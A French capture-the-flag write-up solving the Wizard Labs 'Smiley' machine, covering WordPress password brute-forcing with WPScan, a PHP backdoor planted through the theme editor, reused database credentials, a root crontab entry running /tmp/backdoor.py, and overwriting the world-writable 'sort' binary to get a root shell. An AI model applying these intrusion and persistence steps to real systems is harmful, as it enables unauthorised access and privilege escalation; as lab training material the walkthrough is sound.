# Solution du CTF Smiley de Wizard Labs

Nitro
-----

[Wizard Labs](https://labs.wizard-security.net/) est une plateforme de CTF similaire à *HackTheBox* qui permet d'accéder via VPN à un réseau de machines vulnérables.  

Ici c'est l'occasion de s'attaquer à *Smiley*, l'une des machines qui a un niveau de difficulté de 3 sur 10.  

Gathering
---------

Les services accessibles sur la machine sont caractéristiques d'une machine Linux : ssh, rpcbind et un Apache, tous sur leurs ports habituels.  

Le site web renvoie un *Wordpress* géré par un certain *smiley* :  

![Wizard Labs CTF Smiley wordpress site](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/smiley_wordpress.png)

Je m'empresse d'utiliser [WPscan](https://wpscan.org/) pour énumérer la version de Wordpress et les plugins installés. Cela n'a rien remonté d'intéressant donc on va s'intéresser aux utilisateurs :  

```plain
$ wpscan --url http://10.1.1.42/ -e u1-100 -P top500.txt
[+] Enumerating Users
 Brute Forcing Author IDs - Time: 00:00:01 <=================> (100 / 100) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] smiley
 | Detected By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - smiley / music                                                                                                                                                                    
Trying smiley / nathan Time: 00:00:25 <=================> (325 / 325) 100.00% Time: 00:00:25

[i] Valid Combinations Found:
 | Username: smiley, Password: music
```

Ici j'ai utilisé une wordlist contenant les 500 mots de passe les plus utilisés. On peut trouver des listes de ce site sur Github. *Ncrack* dispose d'une liste similaire [qui contient 5000 passwords](https://github.com/nmap/ncrack/blob/master/lists/top50000.pwd).  

Ces identifiants permettent donc d'accéder à la partie admin du site en se rendant sur */wp-admin*. Dans une situation comme celle-ci on peut installer un module Wordpress qui nous facilite la vie comme pour le [CTF Basic Pentesting: 1](http://devloop.users.sourceforge.net/index.php?article143/solution-du-ctf-basic-pentesting-1-de-vulnhub) ou bien aller modifier un script PHP d'un thème existant dans *Appearance > Editor* (*footer.php* par exemple).  

![Wizard Labs CTF Smiley wordpress theme edit backdoor](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/smiley_wp_edit.png)

Via une backdoor PHP insérée dans le script on peut exécuter des commandes sur le système en tant que *www-data* (pas vraiment de surprises).  

Le système est *Linux smiley 3.16.0-6-586 #1 Debian 3.16.56-1 (2018-04-28) i686 GNU/Linux*.  

On note dans */etc/passwd* la présence d'un utilisateur nommé *mike* d'UID 1000.  

Parmi les fichiers qu'il possède on trouve */var/tmp/binary\_as\_root* qui d'après les chaînes présentes dans ce binaire ELF semble être une copie de bash ou d'un autre shell...  

Malgré le nom donné à l'exécutable ce dernier n'est pas setuid et ne dispose pas non plus de [capabilities](https://linux.die.net/man/7/capabilities)...  

PrivEsc
-------

Dans le fichier de configuration de Wordpress on trouve le mot de passe permettant l'accès au MySQL.  

Ça semble inutile de fouiller dans la base *Wordpress* étant donné qu'on dispose du mot de passe de *smiley* mais il s'avère que le mot de passe ci-dessous permette l'accès SSH avec le compte *mike*, de quoi obtenir un shell digne de ce nom :)   

```php
/** The name of the database for WordPress */
define('DB_NAME', 'wpdatabase');

/** MySQL database username */
define('DB_USER', 'wpuser');

/** MySQL database password */
define('DB_PASSWORD', 'Il0veW0rdpress');
```

Dans le dossier personnel de l'utilisateur on trouve un binaire setuid root :  

```plain
-rwsr-xr-x 1 root root 7332 Dec 27 06:03 /home/mike/listwww
```

Ce dernier a un fonctionnement que l'on peut deviner simplement en appliquant la commande strings dessus :  

```plain
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setreuid
printf
system
__cxa_finalize
__libc_start_main
GLIBC_2.1.3
GLIBC_2.0
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
UWVS
[^_]
listing /var/www/html
sleep 3
/bin/ls /var/www/html
```

Il effectue donc un *setreuid(0)* avec de lancer deux commandes bash, la première étant une fonction builtin (sleep), l'autre */bin/ls* avec le path complet...  

Ca ne semble pas laisser trop de possibilités à l'exploitation (jouer sur les PATHs et la recherche des exécutables par le binaire) mais avec [ShellShock](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29) sait-on jamais.  

J'ai donc utilisé [bashcheck](https://github.com/hannob/bashcheck) pour tester la présence de la vulnérabilité bash mais il m'a dis... nope  

```plain
mike@smiley:~$ ./bashcheck
Testing /bin/bash ...
Bash version 4.3.30(1)-release

Variable function parser pre/suffixed [%%, upstream], bugs not exploitable
Not vulnerable to CVE-2014-6271 (original shellshock)
Not vulnerable to CVE-2014-7169 (taviso bug)
Not vulnerable to CVE-2014-7186 (redir_stack bug)
Test for CVE-2014-7187 not reliable without address sanitizer
Not vulnerable to CVE-2014-6277 (lcamtuf bug #1)
Not vulnerable to CVE-2014-6278 (lcamtuf bug #2)
```

J'ai aussi testé la faille XTRACE/PS4 utilisée pour le [CTF /dev/random: k2](http://devloop.users.sourceforge.net/index.php?article154/solution-du-ctf-dev-random-k2-de-vulnhub) sans plus de succès.  

La machine a une autre particularité qui ne peux pas échapper à des yeux avisés :  

```plain
-rwxrwxrwx 1 root root  822 Sep  5 05:29 /etc/crontab
```

Mais j'ai beau eu rajouter une ligne pour faire exécuter un script toutes les minutes :  

```plain
*/1 * * * * root /tmp/backdoor.py
```

... rien ne se passait :-|  

L'autre point inhabituel sur cette machine c'est que de nombreux binaires classiques sont word-writables...  

Du coup j'ai ressortit le script que j'avais fait pour le [CTF Homeless](http://devloop.users.sourceforge.net/index.php?article150/solution-du-ctf-homeless-de-vulnhub) qui surveille la liste des processus lancés sur le système histoire de voir de bons candidats à la réécriture.  

Le script montre que les taches CRON sont bien lancées mais bizarrement pas la notre :(  

```plain
6028 root /usr/sbin/CRON -f
6029 root /bin/sh -c test -x /etc/init.d/anacron && /usr/sbin/invoke-rc.d anacron start >/dev/null
6031 root /bin/sh -c test -x /etc/init.d/anacron && /usr/sbin/invoke-rc.d anacron start >/dev/null
6038 root /bin/sh /usr/sbin/invoke-rc.d anacron start
6040 root xargs
6041 root xargs
6044 root /bin/sh /usr/sbin/invoke-rc.d anacron start
6049 root /bin/sh /usr/sbin/invoke-rc.d anacron start
```

```plain
13317 root /usr/sbin/CRON -f
13319 root /bin/sh -c   [ -x /usr/lib/php5/sessionclean ] && /usr/lib/php5/sessionclean
13320 root /bin/sh -e /usr/lib/php5/sessionclean
13321 root /bin/sh -e /usr/lib/php5/sessionclean
13322 root sort -rn -t: -k2,2
13323 root sort -u -t: -k 1,1
13324 root /bin/sh -e /usr/lib/php5/sessionclean
13326 root /bin/sh -e /usr/lib/php5/sessionclean
```

Pas bien grave puisque j'ai choisit d'écraser le binaire *sort* par mon script Python initial qui m'a donné un accès root plusieurs minutes plus tard ([voir le Github d'infodox](https://github.com/infodox/python-pty-shells) pour des shells sympas en Python) :  

```plain
root@smiley:~# id
uid=0(root) gid=0(root) groups=0(root)
root@smiley:~# cd /root
root@smiley:~# ls -al
total 40
drwx------  5 root root 4096 Jun 15  2018 .
drwxr-xr-x 21 root root 4096 May  4  2018 ..
-rw-------  1 root root   70 Dec 27 06:20 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-------  1 root root  663 May 10  2018 .mysql_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rwx------  1 root root   33 May 10  2018 root.txt
drwxr-xr-x  3 root root 4096 May  4  2018 .vagrant
drwxr-xr-x  7 root root 4096 May  4  2018 .vagrant.d
drwx------  2 root root 4096 May  4  2018 .VirtualBox
root@smiley:~# cat root.txt
a16c3--- snip ---60f2b9b
root@smiley:~# cd /home/mike
root@smiley:/home/mike# ls
listwww  user.txt
root@smiley:/home/mike# cat user.txt
b075f--- snip ---88379
```

That's it
---------

Done ! On était dans de l'exploitation Linux très classique : énumération, brute-force puis escalade de privilège par écrasement d'un binaire ou accès à la crontab.  


*Published November 17 2020 at 13:44*